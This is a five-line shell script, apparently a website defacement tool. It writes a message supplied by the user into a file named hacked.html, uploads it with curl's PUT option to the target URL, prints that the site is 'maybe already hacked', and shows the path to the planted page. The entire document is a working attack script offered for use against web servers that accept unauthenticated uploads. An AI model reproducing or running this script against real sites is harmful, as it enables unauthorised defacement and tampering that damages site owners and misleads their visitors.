echo $2 > hacked.html
curl -T hacked.html $1
echo "_Maybe website already hacked.. check at ur browser! "
echo -e "\n*Access*: "$1"/hacked.html "
rm hacked.html
